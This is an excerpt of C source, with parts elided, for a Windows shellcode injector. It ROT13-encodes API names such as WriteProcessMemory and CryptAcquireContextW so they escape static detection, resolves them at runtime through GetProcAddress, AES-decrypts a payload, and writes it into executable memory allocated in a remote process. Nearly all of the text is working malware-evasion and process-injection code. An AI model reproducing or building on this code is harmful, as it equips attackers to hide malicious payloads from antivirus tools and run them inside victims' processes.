...
typedef BOOL (WINAPI* wProcessMemory )(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);

typedef BOOL (WINAPI* cAcquireContextW) (HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
...
// handling WriteProcessMemory differently using rotrotrot
char unsigned cipher_wProcessMemory[] = {'J', 'e', 'v', 'g', 'r', 'C', 'e', 'b', 'p', 'r', 'f', 'f', 'Z', 'r', 'z', 'b', 'e', 'l'}; 
char unsigned r_cAcquireContextW[] = {'P', 'e', 'l', 'c', 'g', 'N', 'p', 'd', 'h', 'v', 'e', 'r', 'P', 'b', 'a', 'g', 'r', 'k', 'g', 'J'};

void rotrotrot( char* result, int result_len){
	
	printf("\nsize of result: %d : %d\n", sizeof(result), sizeof(cipher_wProcessMemory) );
    char current_char;
...
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
		...
		rotrotrot(r_cAcquireContextW, sizeof(r_cAcquireContextW));

		printf("\n Plain string : %s\n", (char *)r_cAcquireContextW);

		cAcquireContextW cAcquireContextWObject = (cAcquireContextW) GetProcAddress(GetModuleHandle("Advapi32.dll"),(char *) r_cAcquireContextW );

        if (!cAcquireContextWObject(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
...
int Inject(HANDLE hProc) {
		...
		rotrotrot(cipher_wProcessMemory, sizeof(cipher_wProcessMemory));

		printf("\n Plain string : %s\n", (char *)cipher_wProcessMemory);
		
		vAllocEx vAllocExObject = (vAllocEx) GetProcAddress(GetModuleHandle("kernel32.dll"), cipher_vAllocEx );
		wProcessMemory wProcessMemoryObject = (wProcessMemory) GetProcAddress(GetModuleHandle("kernel32.dll"),(char *)cipher_wProcessMemory);
		//wProcessMemory wProcessMemoryObject = (wProcessMemory) GetProcAddress(GetModuleHandle("kernel32.dll"),"WriteProcessMemory");


        pRemoteCode = vAllocExObject(hProc, NULL, len_payload, MEM_COMMIT, PAGE_EXECUTE_READ);
        wProcessMemoryObject(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)len_payload, (SIZE_T *)NULL);
